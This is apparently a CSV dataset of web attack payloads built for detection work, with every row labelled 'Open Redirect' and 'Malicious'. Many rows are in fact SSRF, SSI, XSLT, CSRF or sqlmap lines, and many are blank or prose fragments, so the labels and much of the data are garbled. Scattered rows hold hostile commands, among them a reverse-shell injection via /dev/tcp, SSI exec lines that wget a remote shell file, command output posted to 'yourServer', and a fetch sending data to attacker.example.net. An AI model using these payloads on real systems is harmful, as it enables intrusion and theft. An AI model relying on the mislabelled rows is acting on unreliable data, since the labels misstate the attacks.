Payload,Signature,AttackType,Severity,MITRE,Label,Description
mode: 'cors' // throw an error instead of following redirect,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
location = 'https://www.example.com/',Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
        body: ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
var redirectTo = """"http://trusted.com"""";""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
window.location = redirectTo;,Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
?redirect_uri={payload},Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
?redirect_url={payload},Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
?redirect={payload},Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
/redirect/{payload},Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
www.whitelisted.com.evil.com redirect to evil.com,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
An attacker could exploit an open redirect here by replacing the ",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Using slashes in URLs: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<!--#exec cmd=""curl http://sn1persecurity.com/.testing/rfi_vuln.php"" -->",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<!--#exec cmd=""wget http://website.com/dir/shell.txt"" -->",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<!--#include virtual=""http://sn1persecurity.com/.testing/rfi_vuln.php"" -->",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<!--#include virtual=""https://crowdshield.com/.testing/rfi_vuln.php"" -->",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<esi:include src=""http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/""/>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<esi:include src=""http://host/poc.xml"" dca=""xslt"" stylesheet=""http://google.com/poc.xsl"" />",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
<esi:include src=http://google.com/>,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
(2) URL encode the result and append to https://exfiltrate.server.net/data=,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Leak prompt: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Force XSS output: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Force SQLi output: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* SSRF vulnerability: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://google.com/%2f..,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.whitelisteddomain.tld@google.com/%2f..,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://google.com/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.whitelisteddomain.tld@google.com/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//https://google.com//,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//https://www.whitelisteddomain.tld@google.com//,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//https://www.google.com/%2e%2e%2f,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//https:///www.google.com/%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.google.com/%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https:///www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://%5cgoogle.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
/https://%5cwww.whitelisteddomain.tld@google.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
The following PHP script can be used to generate a page that will redirect to the ",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
echo var_dump(filter_var(""""http://test???test.com"""""," FILTER_VALIDATE_URL));""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
jar:http://127.0.0.1!/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
jar:https://127.0.0.1!/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
jar:ftp://127.0.0.1!/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
ssrf.php?url=http://127.0.0.1:22,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
ssrf.php?url=http://127.0.0.1:80,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
ssrf.php?url=http://127.0.0.1:443,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
ssrf.php?url=sftp://evil.com:11111/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
  ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"  """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"| localtest.me                 | """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"   """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"2. Launch the SSRF pointing to """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Redirects to """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Redirects to """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"For example to rotate between """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"Parsing behavior by different libraries: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
 and browsers redirect to ,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"- """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
window.opener.location = """"http://evil.com""""""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# Vuln website : https://github.com/ajinabraham/bad_python_extract,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# More info : https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# Written by Wireghoul - http://www.justanotherhacker.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
test = @(http://[REDACTED]),Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"fill 'url(https://127.0.0.1/test.jpg""|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch ""hello)'",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Use double extensions : """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* PNG: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"Create a custom picture and insert exif tag with """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
The ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,High,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"curl -F ""r=`id`"" http://yourServer:1337/",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
	Source: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"	print("" |  website: http://virtualabs.fr"")",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
apply-to-redirect-ref,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
header-status-redirect,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
origin~https://%s.%h,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirected-accept-language,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-found,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-found,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-multiple-choices,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-not-modified,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-permanent,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-see-other,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-temporary,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-unused,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirection-use-proxy,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-perm,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-post,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-problem-withoutwww,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-problem-withwww,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-proxy,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect-temp,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
referer~http://%s.%h/,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
request-error-redirects,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
temporary-redirect,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
x-amz-website-redirect-location,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
x-flx-redirect-url,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
prips 93.184.216.0/24 | hakoriginfinder -h https://example.com:443/foo,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"curl -H ""Host: admin.example.com"" http://10.10.10.10/",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
2. Detecting normalization: ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
In Cloudflare CDN," one can implement a """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"token = requests.get(""https://example.com/uuid"").json()[""uuid""]",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits),Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:copy-of select=""document('http://172.16.132.1:25')""/>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"xmlns:exploit=""http://exslt.org/common""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"include(""http://10.10.10.10/test.php"")",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"" version=""1.0"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:rt=""http://xml.apache.org/xalan/java/java.lang.Runtime"" xmlns:ob=""http://xml.apache.org/xalan/java/java.lang.Object"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""2.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:java=""http://saxon.sf.net/java-type"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:App=""http://www.tempuri.org/App"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
proc.StartInfo.RedirectStandardOutput = true;,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<a href=""http://www.example.com/api/setusername?username=CSRFd"">Click Me</a>",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<img src=""http://www.example.com/api/setusername?username=CSRFd"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<form action=""http://www.example.com/api/setusername"" enctype=""text/plain"" method=""POST"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"<form id=""autosubmit"" action=""http://www.example.com/api/setusername"" enctype=""text/plain"" method=""POST"">",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"xhr.open(""GET"", ""http://www.example.com/api/currentuser"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"xhr.open(""POST"", ""http://www.example.com/api/setrole"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"xhr.open(""POST"", ""http://www.example.com/api/setrole"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
../http://malicious.com`,Traversal,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
%E3%80%82,OpenRedir,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
%E3%80%82,GENERIC_INJECTION,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
../http://malicious.com`,GENERIC_INJECTION,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
../http://malicious.com`,Traversal,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
%E3%80%82,OpenRedir,Open Redirect,Medium,T1190,Malicious,Open Redirect attack attempt
"response.sendRedirect(""http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
<?php,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
/* Redirect browser */,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"header(""Location: http://www.mysite.com"");",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
?>,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
"Response.Redirect(""~/folder/Login.aspx"")",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from payloadbox/open-redirect-payload-list repository (main branch)
